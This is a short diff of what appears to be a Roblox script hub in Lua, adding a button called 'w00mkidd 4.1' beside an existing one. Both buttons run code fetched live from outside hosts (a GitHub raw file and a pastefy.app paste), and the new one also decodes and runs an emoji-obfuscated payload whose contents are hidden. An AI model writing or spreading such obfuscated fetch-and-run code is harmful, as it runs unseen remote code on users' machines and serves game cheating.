@@ -53,3 +53,10 @@ Tab:AddButton({
         loadstring(Game:HttpGet("https://raw.githubusercontent.com/hi822010/GoodRC7/refs/heads/main/update.lua"))()
     end    
 })
+
+Tab:AddButton({
+    Name = "w00mkidd 4.1",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastefy.app/K6CXixR7/raw"))()loadstring(Decode("😶 🤫 😋 😜 😱 🤨 🤗 😬 🤔 😔 🌜 😔 😋 🤐 🤪 ↕️️ 🤣 🤨 🤨 🤭 😂 🤪 🤨 🌜 🙌 🥺 🤨 🤨 🤭 😱 ↕️️ ➗ ➗ 🤭 😋 😱 🤨 🤪 🥴 😠 👆 😋 🤭 🤭 ➗ 🤭 🧐 😘 ❤️ 🤩 😙 🧡 ☺️ ➗ 🤗 😋 🙄 🙌 🌛 🌛 🌜 🌛 ","G-Code"))()
+    end    
+})
